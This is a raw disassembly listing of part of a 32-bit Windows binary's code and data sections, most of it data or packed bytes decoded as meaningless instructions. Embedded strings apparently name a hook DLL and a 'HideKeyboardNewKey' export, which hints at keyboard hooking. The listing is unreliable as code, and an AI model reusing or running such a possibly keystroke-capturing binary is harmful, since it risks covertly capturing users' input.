  412a34:	and    cl,bl
  412a36:	cmp    ebp,esp
  412a38:	ja     0x412a75
  412a3a:	dec    ecx
  412a3b:	sbb    BYTE PTR ds:0x463637fe,dl
  412a41:	mov    DWORD PTR [edx-0xa50a409],ecx
  412a47:	outs   dx,BYTE PTR ds:[esi]
  412a48:	xchg   ebx,eax
  412a49:	mov    ds:0x8f98302d,eax
  412a4e:	lea    esp,[esi]
  412a50:	cmp    DWORD PTR [ebx],edx
  412a52:	pop    eax
  412a53:	ret    0xc023
  412a56:	push   0x7320168
  412a5b:	scas   al,BYTE PTR es:[edi]
  412a5c:	xlat   BYTE PTR ds:[ebx]
  412a5d:	cmp    BYTE PTR [esi*1+0x143888e4],bl
  412a64:	push   ebx
  412a65:	sub    ebp,DWORD PTR [edx-0x70f462a4]
  412a6b:	maskmovq mm4,mm3
  412a6e:	push   0x5
  412a70:	(bad)  
  412a71:	cdq    
  412a72:	jmp    0xb9d:0x2984db9
  412a79:	jle    0x412a6e
  412a7b:	jo     0x412a4b
  412a7d:	jo     0x4129ff
  412a7f:	push   ecx
  412a80:	in     eax,0xfb
  412a82:	sbb    al,0x6e
  412a84:	stc    
  412a85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a86:	xchg   edx,eax
  412a87:	mov    al,ds:0x58373a56
  412a8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a8d:	cld    
  412a8e:	outs   dx,BYTE PTR ds:[esi]
  412a8f:	xlat   BYTE PTR ds:[ebx]
  412a90:	push   eax
  412a91:	iret   
  412a92:	fwait
  412a93:	add    ebp,ecx
  412a95:	dec    esp
  412a96:	sahf   
  412a97:	adc    BYTE PTR es:[edx-0x3da25350],ch
  412a9e:	inc    edx
  412a9f:	sbb    DWORD PTR [ebp-0x43],eax
  412aa2:	jo     0x412ac7
  412aa4:	cld    
  412aa5:	out    0x5c,eax
  412aa7:	dec    edi
  412aa8:	fdiv   DWORD PTR [esp+ebp*2+0x10afd626]
  412aaf:	call   0xbe9c:0xd52eb1a5
  412ab6:	mov    edx,DWORD PTR [ecx+0x5d70c755]
  412abc:	xor    eax,0x53693a62
  412ac1:	(bad)  
  412ac2:	or     edx,DWORD PTR [edx-0x5b]
  412ac5:	mov    ch,0xc
  412ac7:	es out dx,eax
  412ac9:	dec    eax
  412aca:	xchg   ecx,eax
  412acb:	push   ss
  412acc:	imul   edx,ebx,0x4e54cb5e
  412ad2:	sbb    BYTE PTR [ebx-0x8],0xab
  412ad6:	adc    eax,0x890ed452
  412adb:	mov    ah,0x14
  412add:	stos   BYTE PTR es:[edi],al
  412ade:	pushf  
  412adf:	cmp    DWORD PTR [eax],edx
  412ae1:	test   DWORD PTR [eax],ebp
  412ae3:	or     BYTE PTR [ecx+0x6278746f],al
  412ae9:	and    BYTE PTR [ebp-0x31],cl
  412aec:	div    DWORD PTR [eax+0x7c]
  412aef:	xor    dh,BYTE PTR [esi-0x23]
  412af2:	mov    WORD PTR [esi],ss
  412af4:	out    dx,al
  412af5:	(bad)  
  412af6:	or     al,0xac
  412af8:	in     eax,dx
  412af9:	sbb    ch,BYTE PTR [edx+ebx*8]
  412afc:	pop    es
  412afd:	sub    esp,DWORD PTR [edi]
  412aff:	fmul   QWORD PTR ds:[ebx+0x19]
  412b03:	je     0x412b5d
  412b05:	popa   
  412b06:	push   ebx
  412b07:	xchg   ecx,eax
  412b08:	imul   edi,DWORD PTR [ebx],0xcb126778
  412b0e:	dec    DWORD PTR ds:0x58617ca2
  412b14:	pop    es
  412b15:	push   ss
  412b16:	data16 cmp ah,dh
  412b19:	pop    es
  412b1a:	popa   
  412b1b:	int3   
  412b1c:	es mov esi,0x4160b08c
  412b22:	sub    esp,DWORD PTR [ebx+0x30]
  412b25:	and    BYTE PTR [ebx+0x536a893],dl
  412b2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b2c:	mov    dl,0xd8
  412b2e:	loop   0x412b00
  412b30:	scas   al,BYTE PTR es:[edi]
  412b31:	addr16 iret 
  412b33:	sub    al,0xe2
  412b35:	dec    ebp
  412b36:	push   cs
  412b37:	add    eax,0x42b724b9
  412b3c:	and    eax,0x4fc54b02
  412b41:	xor    dh,ah
  412b43:	(bad)  
  412b45:	add    dh,al
  412b47:	add    BYTE PTR [edi],cl
  412b49:	retf   0xb63a
  412b4c:	mov    ch,0x25
  412b4e:	ins    BYTE PTR es:[edi],dx
  412b4f:	inc    eax
  412b50:	retf   
  412b51:	sbb    eax,0x6d1b6d8f
  412b56:	(bad)  
  412b57:	push   ebp
  412b58:	pop    eax
  412b59:	addr16 pop esp
  412b5b:	ja     0x412b7d
  412b5d:	bound  edi,QWORD PTR [edi+0x3c8dbe7a]
  412b63:	fstp   TBYTE PTR [ebp-0x10]
  412b66:	mov    ch,0x10
  412b68:	adc    DWORD PTR [esi+0x48],ecx
  412b6b:	push   ecx
  412b6c:	adc    ch,BYTE PTR [ebx-0x474c4239]
  412b72:	dec    edx
  412b73:	pusha  
  412b74:	lahf   
  412b75:	popa   
  412b76:	pop    esp
  412b77:	sub    eax,0x4c1f593b
  412b7c:	xor    al,0x42
  412b7e:	push   ebp
  412b7f:	clc    
  412b80:	sbb    BYTE PTR [ebx+eax*2],bl
  412b83:	and    DWORD PTR [esi-0x44],ebp
  412b86:	outs   dx,BYTE PTR ds:[esi]
  412b87:	sahf   
  412b88:	fmul   DWORD PTR [ecx-0xc903ab]
  412b8e:	sub    edi,DWORD PTR [ecx+0x69]
  412b91:	pop    ss
  412b92:	cwde   
  412b93:	cdq    
  412b94:	mov    eax,0xaa29fc28
  412b99:	xlat   BYTE PTR ds:[ebx]
  412b9a:	pop    ebx
  412b9b:	pushw  0xc2ac
  412b9f:	iret   
  412ba0:	gs cmp al,ah
  412ba3:	and    BYTE PTR ds:0x45980448,cl
  412ba9:	jp     0x412bf1
  412bab:	mov    edx,0x98e48f7e
  412bb0:	ja     0x412bb2
  412bb2:	ss push esi
  412bb4:	mov    dl,0xdd
  412bb6:	out    dx,al
  412bb7:	xchg   ebx,eax
  412bb8:	or     ebp,DWORD PTR [ebx]
  412bba:	loope  0x412bad
  412bbc:	and    al,BYTE PTR [edi]
  412bbe:	pop    ebx
  412bbf:	movlps QWORD PTR [ecx],xmm6
  412bc2:	icebp  
  412bc3:	fstp   st(1)
  412bc5:	popf   
  412bc6:	outs   dx,DWORD PTR ds:[esi]
  412bc7:	cdq    
  412bc8:	mov    esi,0x2bf3370b
  412bcd:	pop    ds
  412bce:	jl     0x412c22
  412bd0:	loope  0x412c0e
  412bd2:	pop    esp
  412bd3:	cmp    al,0xd0
  412bd5:	out    0x79,eax
  412bd7:	jecxz  0x412bdc
  412bd9:	nop
  412bda:	ret    0xb0a
  412bdd:	push   0x4
  412bdf:	pop    ebx
  412be0:	inc    ebx
  412be1:	xchg   ebx,ecx
  412be3:	sub    ebx,ecx
  412be5:	xchg   ebx,ecx
  412be7:	dec    ecx
  412be8:	mov    eax,DWORD PTR [ebp-0x1c]
  412beb:	imul   eax,ecx
  412bee:	add    esp,eax
  412bf0:	xchg   edx,eax
  412bf1:	push   eax
  412bf2:	xor    ebx,ebx
  412bf4:	mov    edx,esp
  412bf6:	dec    edx
  412bf7:	inc    ebx
  412bf8:	add    ebx,DWORD PTR [edx+ebx*1]
  412bfb:	dec    ebx
  412bfc:	xor    edx,edx
  412bfe:	add    DWORD PTR [ebp-0xc],ebx
  412c01:	pop    ebx
  412c02:	mov    eax,DWORD PTR [ebp-0xc]
  412c05:	pop    edi
  412c06:	pop    esi
  412c07:	pop    ebx
  412c08:	leave  
  412c09:	ret    0x10

Disassembly of section .data:

00413000 <.data>:
  413000:	xor    al,0x39
  413002:	add    DWORD PTR [eax],eax
  413004:	inc    edx
  413005:	cmp    DWORD PTR [ecx],eax
  413007:	add    BYTE PTR [ecx+edi*1+0x1],cl
  41300b:	add    BYTE PTR [ecx+edi*1+0x1],dl
  41300f:	add    BYTE PTR [esi+0x39],bl
  413012:	add    DWORD PTR [eax],eax
  413014:	push   0x39
  413016:	add    DWORD PTR [eax],eax
  413018:	jl     0x413053
  41301a:	add    DWORD PTR [eax],eax
  41301c:	xchg   BYTE PTR [ecx],bh
  41301e:	add    DWORD PTR [eax],eax
  413020:	xchg   esp,eax
  413021:	cmp    DWORD PTR [ecx],eax
  413023:	add    BYTE PTR [ecx+edi*1+0x39a80001],bl
  41302a:	add    DWORD PTR [eax],eax
  41302c:	mov    ah,0x39
  41302e:	add    DWORD PTR [eax],eax
  413030:	les    edi,FWORD PTR [ecx]
  413032:	add    DWORD PTR [eax],eax
  413034:	into   
  413035:	cmp    DWORD PTR [ecx],eax
  413037:	add    dh,dl
  413039:	cmp    DWORD PTR [ecx],eax
  41303b:	add    dl,ah
  41303d:	cmp    DWORD PTR [ecx],eax
  41303f:	add    dl,ch
  413041:	cmp    DWORD PTR [ecx],eax
  413043:	add    ah,dh
  413045:	cmp    DWORD PTR [ecx],eax
  413047:	add    ah,bh
  413049:	cmp    DWORD PTR [ecx],eax
  41304b:	add    BYTE PTR [eax],cl
  41304d:	cmp    al,BYTE PTR [ecx]
  41304f:	add    BYTE PTR [edx],dl
  413051:	cmp    al,BYTE PTR [ecx]
  413053:	add    BYTE PTR [edx],bl
  413055:	cmp    al,BYTE PTR [ecx]
  413057:	add    BYTE PTR [edx+edi*1],ah
  41305a:	add    DWORD PTR [eax],eax
  41305c:	xor    BYTE PTR [edx],bh
  41305e:	add    DWORD PTR [eax],eax
  413060:	cmp    bh,BYTE PTR [edx]
  413062:	add    DWORD PTR [eax],eax
  413064:	dec    eax
  413065:	cmp    al,BYTE PTR [ecx]
  413067:	add    BYTE PTR [edx+0x3a],dl
  41306a:	add    DWORD PTR [eax],eax
  41306c:	pop    esi
  41306d:	cmp    al,BYTE PTR [ecx]
  41306f:	add    BYTE PTR [edx+edi*1+0x1],ch
  413073:	add    BYTE PTR [edx+0x3a],bh
  413076:	add    DWORD PTR [eax],eax
  413078:	test   BYTE PTR [edx],bh
  41307a:	add    DWORD PTR [eax],eax
  41307c:	mov    ?,WORD PTR [edx]
  41307e:	add    DWORD PTR [eax],eax
  413080:	cwde   
  413081:	cmp    al,BYTE PTR [ecx]
  413083:	add    BYTE PTR [edx-0x55fffec6],ah
  413089:	cmp    al,BYTE PTR [ecx]
  41308b:	add    BYTE PTR [edx+edi*1+0x3abe0001],dh
  413092:	add    DWORD PTR [eax],eax
  413094:	enter  0x13a,0x0
  413098:	fdivr  QWORD PTR [edx]
  41309a:	add    DWORD PTR [eax],eax
  41309c:	out    0x3a,al
  41309e:	add    DWORD PTR [eax],eax
  4130a0:	repnz cmp al,BYTE PTR [ecx]
  4130a3:	add    dh,bh
  4130a5:	cmp    al,BYTE PTR [ecx]
  4130a7:	add    BYTE PTR [eax],cl
  4130a9:	cmp    eax,DWORD PTR [ecx]
  4130ab:	add    BYTE PTR [eax],bl
  4130ad:	cmp    eax,DWORD PTR [ecx]
  4130af:	add    BYTE PTR [eax],al
  4130b1:	add    BYTE PTR [eax],al
  4130b3:	add    BYTE PTR [esi],ch
  4130b5:	cmp    eax,DWORD PTR [ecx]
  4130b7:	add    BYTE PTR [edx+0x3b],al
  4130ba:	add    DWORD PTR [eax],eax
  4130bc:	pop    eax
  4130bd:	cmp    eax,DWORD PTR [ecx]
  4130bf:	add    BYTE PTR [eax+0x3b],ch
  4130c2:	add    DWORD PTR [eax],eax
  4130c4:	je     0x413101
  4130c6:	add    DWORD PTR [eax],eax
  4130c8:	nop
  4130c9:	cmp    eax,DWORD PTR [ecx]
  4130cb:	add    BYTE PTR [ebx+edi*1+0x3bb40001],bl
  4130d2:	add    DWORD PTR [eax],eax
  4130d4:	int3   
  4130d5:	cmp    eax,DWORD PTR [ecx]
  4130d7:	add    dl,bl
  4130d9:	cmp    eax,DWORD PTR [ecx]
  4130db:	add    dh,ah
  4130dd:	cmp    eax,DWORD PTR [ecx]
  4130df:	add    al,bh
  4130e1:	cmp    eax,DWORD PTR [ecx]
  4130e3:	add    BYTE PTR [esp+edi*1],cl
  4130e6:	add    DWORD PTR [eax],eax
  4130e8:	sbb    bh,BYTE PTR [ecx+eax*1]
  4130eb:	add    BYTE PTR [edx],ch
  4130ed:	cmp    al,0x1
  4130ef:	add    BYTE PTR [edx],bh
  4130f1:	cmp    al,0x1
  4130f3:	add    BYTE PTR [esi+0x3c],cl
  4130f6:	add    DWORD PTR [eax],eax
  4130f8:	pop    edx
  4130f9:	cmp    al,0x1
  4130fb:	add    BYTE PTR [edx+0x3c],ch
  4130fe:	add    DWORD PTR [eax],eax
  413100:	js     0x41313e
  413102:	add    DWORD PTR [eax],eax
  413104:	xchg   edx,eax
  413105:	cmp    al,0x1
  413107:	add    BYTE PTR [esp+edi*1+0x3cb20001],ah
  41310e:	add    DWORD PTR [eax],eax
  413110:	ret    0x13c
  413113:	add    ah,dl
  413115:	cmp    al,0x1
  413117:	add    dh,ah
  413119:	cmp    al,0x1
  41311b:	add    ah,dh
  41311d:	cmp    al,0x1
  41311f:	add    dh,bh
  413121:	cmp    al,0x1
  413123:	add    BYTE PTR [esi],cl
  413125:	cmp    eax,0x3d1e0001
  41312a:	add    DWORD PTR [eax],eax
  41312c:	sub    al,0x3d
  41312e:	add    DWORD PTR [eax],eax
  413130:	cmp    bh,BYTE PTR ds:0x3d4c0001
  413136:	add    DWORD PTR [eax],eax
  413138:	pop    eax
  413139:	cmp    eax,0x3d6e0001
  41313e:	add    DWORD PTR [eax],eax
  413140:	cmp    BYTE PTR ds:0x3d920001,0x1
  413147:	add    BYTE PTR [esi-0x45fffec3],ah
  41314d:	cmp    eax,0x3dce0001
  413152:	add    DWORD PTR [eax],eax
  413154:	jmp    0x13d:0xf800013d
  41315b:	add    BYTE PTR [esi],al
  41315d:	add    DWORD PTR ds:[eax],eax
  413160:	sbb    al,0x3e
  413162:	add    DWORD PTR [eax],eax
  413164:	sub    bh,BYTE PTR [esi]
  413166:	add    DWORD PTR [eax],eax
  413168:	cmp    al,0x3e
  41316a:	add    DWORD PTR [eax],eax
  41316c:	dec    eax
  41316d:	add    DWORD PTR ds:[eax],eax
  413170:	pop    esp
  413171:	add    DWORD PTR ds:[eax],eax
  413174:	ins    BYTE PTR es:[edi],dx
  413175:	add    DWORD PTR ds:[eax],eax
  413178:	jl     0x4131b8
  41317a:	add    DWORD PTR [eax],eax
  41317c:	mov    BYTE PTR [esi],bh
  41317e:	add    DWORD PTR [eax],eax
  413180:	cwde   
  413181:	add    DWORD PTR ds:[eax],eax
  413184:	lods   al,BYTE PTR ds:[esi]
  413185:	add    DWORD PTR ds:[eax],eax
  413188:	mov    edx,0xcc00013e
  41318d:	add    DWORD PTR ds:[eax],eax
  413190:	fidivr DWORD PTR [esi]
  413192:	add    DWORD PTR [eax],eax
  413194:	lock add DWORD PTR ds:[eax],eax
  413198:	(bad)  
  413199:	add    DWORD PTR ds:[eax],eax
  41319c:	push   cs
  41319d:	aas    
  41319e:	add    DWORD PTR [eax],eax
  4131a0:	sbb    bh,BYTE PTR [edi]
  4131a2:	add    DWORD PTR [eax],eax
  4131a4:	sub    bh,BYTE PTR [edi]
  4131a6:	add    DWORD PTR [eax],eax
  4131a8:	cmp    BYTE PTR [edi],bh
  4131aa:	add    DWORD PTR [eax],eax
  4131ac:	dec    esi
  4131ad:	aas    
  4131ae:	add    DWORD PTR [eax],eax
  4131b0:	bound  edi,QWORD PTR [edi]
  4131b2:	add    DWORD PTR [eax],eax
  4131b4:	outs   dx,BYTE PTR ds:[esi]
  4131b5:	aas    
  4131b6:	add    DWORD PTR [eax],eax
  4131b8:	js     0x4131f9
  4131ba:	add    DWORD PTR [eax],eax
  4131bc:	xchg   BYTE PTR [edi],bh
  4131be:	add    DWORD PTR [eax],eax
  4131c0:	xchg   esp,eax
  4131c1:	aas    
  4131c2:	add    DWORD PTR [eax],eax
  4131c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131c5:	aas    
  4131c6:	add    DWORD PTR [eax],eax
  4131c8:	mov    dh,0x3f
  4131ca:	add    DWORD PTR [eax],eax
  4131cc:	enter  0x13f,0x0
  4131d0:	fidivr DWORD PTR [edi]
  4131d2:	add    DWORD PTR [eax],eax
  4131d4:	in     al,dx
  4131d5:	aas    
  4131d6:	add    DWORD PTR [eax],eax
  4131d8:	clc    
  4131d9:	aas    
  4131da:	add    DWORD PTR [eax],eax
  4131dc:	or     al,BYTE PTR [eax+0x1]
  4131df:	add    BYTE PTR [edx],ah
  4131e1:	inc    eax
  4131e2:	add    DWORD PTR [eax],eax
  4131e4:	xor    al,0x40
  4131e6:	add    DWORD PTR [eax],eax
  4131e8:	dec    eax
  4131e9:	inc    eax
  4131ea:	add    DWORD PTR [eax],eax
  4131ec:	pop    edx
  4131ed:	inc    eax
  4131ee:	add    DWORD PTR [eax],eax
  4131f0:	fs inc eax
  4131f2:	add    DWORD PTR [eax],eax
  4131f4:	je     0x413236
  4131f6:	add    DWORD PTR [eax],eax
  4131f8:	add    BYTE PTR [eax+0x1],0x0
  4131fc:	cwde   
  4131fd:	inc    eax
  4131fe:	add    DWORD PTR [eax],eax
  413200:	lods   al,BYTE PTR ds:[esi]
  413201:	inc    eax
  413202:	add    DWORD PTR [eax],eax
  413204:	mov    esp,0xca000140
  413209:	inc    eax
  41320a:	add    DWORD PTR [eax],eax
  41320c:	loopne 0x41324e
  41320e:	add    DWORD PTR [eax],eax
  413210:	lock inc eax
  413212:	add    DWORD PTR [eax],eax
  413214:	or     BYTE PTR [ecx+0x1],al
  413217:	add    BYTE PTR [esi],dl
  413219:	inc    ecx
  41321a:	add    DWORD PTR [eax],eax
  41321c:	sub    BYTE PTR [ecx+0x1],al
  41321f:	add    BYTE PTR [esi],dh
  413221:	inc    ecx
  413222:	add    DWORD PTR [eax],eax
  413224:	inc    esp
  413225:	inc    ecx
  413226:	add    DWORD PTR [eax],eax
  413228:	push   edx
  413229:	inc    ecx
  41322a:	add    DWORD PTR [eax],eax
  41322c:	pusha  
  41322d:	inc    ecx
  41322e:	add    DWORD PTR [eax],eax
  413230:	jo     0x413273
  413232:	add    DWORD PTR [eax],eax
  413234:	test   BYTE PTR [ecx+0x1],al
  413237:	add    BYTE PTR [edx-0x5ffffebf],dl
  41323d:	inc    ecx
  41323e:	add    DWORD PTR [eax],eax
  413240:	scas   al,BYTE PTR es:[edi]
  413241:	inc    ecx
  413242:	add    DWORD PTR [eax],eax
  413244:	mov    esi,0xd6000141
  413249:	inc    ecx
  41324a:	add    DWORD PTR [eax],eax
  41324c:	call   0xfa413392
  413251:	inc    ecx
  413252:	add    DWORD PTR [eax],eax
  413254:	push   es
  413255:	inc    edx
  413256:	add    DWORD PTR [eax],eax
  413258:	sbb    BYTE PTR [edx+0x1],al
  41325b:	add    BYTE PTR [esi],ch
  41325d:	inc    edx
  41325e:	add    DWORD PTR [eax],eax
  413260:	cmp    al,BYTE PTR [edx+0x1]
  413263:	add    BYTE PTR [esi+0x42],cl
  413266:	add    DWORD PTR [eax],eax
  413268:	pusha  
  413269:	inc    edx
  41326a:	add    DWORD PTR [eax],eax
  41326c:	add    BYTE PTR [eax],al
  41326e:	add    BYTE PTR [eax],al
  413270:	add    BYTE PTR [edx+0x1],0x0
  413274:	cwde   
  413275:	inc    edx
  413276:	add    DWORD PTR [eax],eax
  413278:	scas   al,BYTE PTR es:[edi]
  413279:	inc    edx
  41327a:	add    DWORD PTR [eax],eax
  41327c:	mov    edx,0xca000142
  413281:	inc    edx
  413282:	add    DWORD PTR [eax],eax
  413284:	fadd   QWORD PTR [edx+0x1]
  413287:	add    ah,ch
  413289:	inc    edx
  41328a:	add    DWORD PTR [eax],eax
  41328c:	clc    
  41328d:	inc    edx
  41328e:	add    DWORD PTR [eax],eax
  413290:	push   cs
  413291:	inc    ebx
  413292:	add    DWORD PTR [eax],eax
  413294:	sbb    BYTE PTR [ebx+0x1],al
  413297:	add    BYTE PTR [ebx+eax*2],ah
  41329a:	add    DWORD PTR [eax],eax
  41329c:	xor    al,BYTE PTR [ebx+0x1]
  41329f:	add    BYTE PTR [edx+0x43],al
  4132a2:	add    DWORD PTR [eax],eax
  4132a4:	push   eax
  4132a5:	inc    ebx
  4132a6:	add    DWORD PTR [eax],eax
  4132a8:	pop    edx
  4132a9:	inc    ebx
  4132aa:	add    DWORD PTR [eax],eax
  4132ac:	outs   dx,BYTE PTR ds:[esi]
  4132ad:	inc    ebx
  4132ae:	add    DWORD PTR [eax],eax
  4132b0:	test   BYTE PTR [ebx+0x1],al
  4132b3:	add    BYTE PTR [ebx+eax*2+0x43a40001],dl
  4132ba:	add    DWORD PTR [eax],eax
  4132bc:	mov    eax,0xcc000143
  4132c1:	inc    ebx
  4132c2:	add    DWORD PTR [eax],eax
  4132c4:	fiadd  DWORD PTR [ebx+0x1]
  4132c7:	add    dl,ch
  4132c9:	inc    ebx
  4132ca:	add    DWORD PTR [eax],eax
  4132cc:	clc    
  4132cd:	inc    ebx
  4132ce:	add    DWORD PTR [eax],eax
  4132d0:	or     BYTE PTR [ecx+eax*1+0x0],al
  4132d4:	adc    al,0x44
  4132d6:	add    DWORD PTR [eax],eax
  4132d8:	and    BYTE PTR [ecx+eax*1+0x0],al
  4132dc:	xor    al,0x44
  4132de:	add    DWORD PTR [eax],eax
  4132e0:	inc    esi
  4132e1:	inc    esp
  4132e2:	add    DWORD PTR [eax],eax
  4132e4:	pop    edx
  4132e5:	inc    esp
  4132e6:	add    DWORD PTR [eax],eax
  4132e8:	inc    sp
  4132ea:	add    DWORD PTR [eax],eax
  4132ec:	jbe    0x413332
  4132ee:	add    DWORD PTR [eax],eax
  4132f0:	mov    es,WORD PTR [ecx+eax*1+0x0]
  4132f4:	sahf   
  4132f5:	inc    esp
  4132f6:	add    DWORD PTR [eax],eax
  4132f8:	scas   al,BYTE PTR es:[edi]
  4132f9:	inc    esp
  4132fa:	add    DWORD PTR [eax],eax
  4132fc:	mov    BYTE PTR [ecx+eax*1+0x0],0xd0
  413301:	inc    esp
  413302:	add    DWORD PTR [eax],eax
  413304:	in     al,dx
  413305:	inc    esp
  413306:	add    DWORD PTR [eax],eax
  413308:	clc    
  413309:	inc    esp
  41330a:	add    DWORD PTR [eax],eax
  41330c:	or     al,BYTE PTR [ebp+0x1]
  41330f:	add    BYTE PTR [esi],bl
  413311:	inc    ebp
  413312:	add    DWORD PTR [eax],eax
  413314:	sub    BYTE PTR [ebp+0x1],al
  413317:	add    BYTE PTR [eax],bh
  413319:	inc    ebp
  41331a:	add    DWORD PTR [eax],eax
  41331c:	inc    esp
  41331d:	inc    ebp
  41331e:	add    DWORD PTR [eax],eax
  413320:	dec    esi
  413321:	inc    ebp
  413322:	add    DWORD PTR [eax],eax
  413324:	pop    edx
  413325:	inc    ebp
  413326:	add    DWORD PTR [eax],eax
  413328:	add    BYTE PTR [eax],al
  41332a:	add    BYTE PTR [eax],al
  41332c:	jbe    0x413373
  41332e:	add    DWORD PTR [eax],eax
  413330:	mov    BYTE PTR [ebp+0x1],al
  413333:	add    BYTE PTR [eax-0x51fffebb],ah
  413339:	inc    ebp
  41333a:	add    DWORD PTR [eax],eax
  41333c:	retf   0x145
  41333f:	add    ah,bl
  413341:	inc    ebp
  413342:	add    DWORD PTR [eax],eax
  413344:	in     al,dx
  413345:	inc    ebp
  413346:	add    DWORD PTR [eax],eax
  413348:	add    BYTE PTR [esi+0x1],al
  41334b:	add    BYTE PTR [eax],bl
  41334d:	inc    esi
  41334e:	add    DWORD PTR [eax],eax
  413350:	sub    al,BYTE PTR [esi+0x1]
  413353:	add    BYTE PTR [esi],dh
  413355:	inc    esi
  413356:	add    DWORD PTR [eax],eax
  413358:	dec    edx
  413359:	inc    esi
  41335a:	add    DWORD PTR [eax],eax
  41335c:	pusha  
  41335d:	inc    esi
  41335e:	add    DWORD PTR [eax],eax
  413360:	ins    BYTE PTR es:[edi],dx
  413361:	inc    esi
  413362:	add    DWORD PTR [eax],eax
  413364:	add    BYTE PTR [esi+0x1],0x0
  413368:	xchg   esp,eax
  413369:	inc    esi
  41336a:	add    DWORD PTR [eax],eax
  41336c:	mov    al,ds:0xae000146
  413371:	inc    esi
  413372:	add    DWORD PTR [eax],eax
  413374:	ret    0x146
  413377:	add    dl,bl
  413379:	inc    esi
  41337a:	add    DWORD PTR [eax],eax
  41337c:	call   0xf24134c7
  413381:	inc    esi
  413382:	add    DWORD PTR [eax],eax
  413384:	inc    BYTE PTR [esi+0x1]
  413387:	add    BYTE PTR [esi],cl
  413389:	inc    edi
  41338a:	add    DWORD PTR [eax],eax
  41338c:	and    al,0x47
  41338e:	add    DWORD PTR [eax],eax
  413390:	cmp    al,BYTE PTR [edi+0x1]
  413393:	add    BYTE PTR [edi+eax*2+0x1],cl
  413397:	add    BYTE PTR [edx+0x47],bl
  41339a:	add    DWORD PTR [eax],eax
  41339c:	push   0x47
  41339e:	add    DWORD PTR [eax],eax
  4133a0:	jle    0x4133e9
  4133a2:	add    DWORD PTR [eax],eax
  4133a4:	xchg   esi,eax
  4133a5:	inc    edi
  4133a6:	add    DWORD PTR [eax],eax
  4133a8:	mov    ds:0xba000147,al
  4133ad:	inc    edi
  4133ae:	add    DWORD PTR [eax],eax
  4133b0:	int3   
  4133b1:	inc    edi
  4133b2:	add    DWORD PTR [eax],eax
  4133b4:	fadd   QWORD PTR [edi+0x1]
  4133b7:	add    al,dh
  4133b9:	inc    edi
  4133ba:	add    DWORD PTR [eax],eax
  4133bc:	push   es
  4133bd:	dec    eax
  4133be:	add    DWORD PTR [eax],eax
  4133c0:	sbb    cl,BYTE PTR [eax+0x1]
  4133c3:	add    BYTE PTR [eax],ch
  4133c5:	dec    eax
  4133c6:	add    DWORD PTR [eax],eax
  4133c8:	cmp    cl,BYTE PTR [eax+0x1]
  4133cb:	add    BYTE PTR [eax+0x48],cl
  4133ce:	add    DWORD PTR [eax],eax
  4133d0:	push   esp
  4133d1:	dec    eax
  4133d2:	add    DWORD PTR [eax],eax
  4133d4:	outs   dx,BYTE PTR ds:[esi]
  4133d5:	dec    eax
  4133d6:	add    DWORD PTR [eax],eax
  4133d8:	mov    BYTE PTR [eax+0x1],cl
  4133db:	add    BYTE PTR [eax-0x59fffeb8],bl
  4133e1:	dec    eax
  4133e2:	add    DWORD PTR [eax],eax
  4133e4:	mov    dl,0x48
  4133e6:	add    DWORD PTR [eax],eax
  4133e8:	ror    BYTE PTR [eax+0x1],0x0
  4133ec:	(bad)  
  4133ed:	dec    eax
  4133ee:	add    DWORD PTR [eax],eax
  4133f0:	add    BYTE PTR [eax],al
  4133f2:	add    BYTE PTR [eax],al
  4133f4:	lock dec eax
  4133f6:	add    DWORD PTR [eax],eax
  4133f8:	dec    BYTE PTR [eax+0x1]
  4133fb:	add    BYTE PTR [esi],cl
  4133fd:	dec    ecx
  4133fe:	add    DWORD PTR [eax],eax
  413400:	push   ds
  413401:	dec    ecx
  413402:	add    DWORD PTR [eax],eax
  413404:	cs dec ecx
  413406:	add    DWORD PTR [eax],eax
  413408:	add    BYTE PTR [eax],al
  41340a:	add    BYTE PTR [eax],al
  41340c:	push   eax
  41340d:	dec    ecx
  41340e:	add    DWORD PTR [eax],eax
	...
  413418:	stos   DWORD PTR es:[edi],eax
  413419:	inc    ebx
  41341a:	push   ebp
  41341b:	dec    ebp
  41341c:	add    BYTE PTR [eax],al
  41341e:	add    BYTE PTR [eax],al
  413420:	add    al,BYTE PTR [eax]
  413422:	add    BYTE PTR [eax],al
  413424:	cmp    eax,0xc3000000
  413429:	dec    ecx
  41342a:	add    eax,DWORD PTR [eax]
  41342c:	ret    
  41342d:	cmp    eax,DWORD PTR [ebx]
	...
  413437:	add    BYTE PTR [ebx+0x4d5543],ch
  41343d:	add    BYTE PTR [eax],al
  41343f:	add    BYTE PTR [esi+0x34],ah
  413442:	add    DWORD PTR [eax],eax
  413444:	add    DWORD PTR [eax],eax
  413446:	add    BYTE PTR [eax],al
  413448:	add    DWORD PTR [eax],eax
  41344a:	add    BYTE PTR [eax],al
  41344c:	add    DWORD PTR [eax],eax
  41344e:	add    BYTE PTR [eax],al
  413450:	pop    esp
  413451:	xor    al,0x1
  413453:	add    BYTE PTR [eax+0x34],ah
  413456:	add    DWORD PTR [eax],eax
  413458:	fs xor al,0x1
  41345b:	add    ch,cl
  41345d:	sub    BYTE PTR [eax],al
  41345f:	add    BYTE PTR [edi+0x34],dh
  413462:	add    DWORD PTR [eax],eax
  413464:	add    BYTE PTR [eax],al
  413466:	jb     0x4134d5
  413468:	ins    DWORD PTR es:[edi],dx
  413469:	pop    ecx
  41346a:	dec    eax
  41346b:	outs   dx,DWORD PTR ds:[esi]
  41346c:	imul   ecx,DWORD PTR [eax+0x6c],0x68
  413470:	ja     0x4134e1
  413472:	imul   ebp,DWORD PTR cs:[esi+0x73],0x69483f00
  41347a:	fs gs dec ebx
  41347d:	gs jns 0x4134e2
  413480:	outs   dx,DWORD PTR ds:[esi]
  413481:	popa   
  413482:	jb     0x4134e8
  413484:	dec    esi
  413485:	gs ja  0x4134c8
  413488:	inc    eax
  413489:	pop    ecx
  41348a:	inc    edi
  41348b:	pop    eax
  41348c:	inc    esp
  41348d:	cmp    al,0x56
  41348f:	add    BYTE PTR [eax],al
  413491:	add    BYTE PTR [eax],al
  413493:	add    BYTE PTR [eax],ah
  413495:	xor    eax,0x1
  41349a:	add    BYTE PTR [eax],al
  41349c:	add    BYTE PTR [eax],al
  41349e:	add    BYTE PTR [eax],al
  4134a0:	and    bh,BYTE PTR [ebx]
  4134a2:	add    DWORD PTR [eax],eax
  4134a4:	add    BYTE PTR [eax],dh
  4134a6:	add    DWORD PTR [eax],eax
  4134a8:	aam    0x35
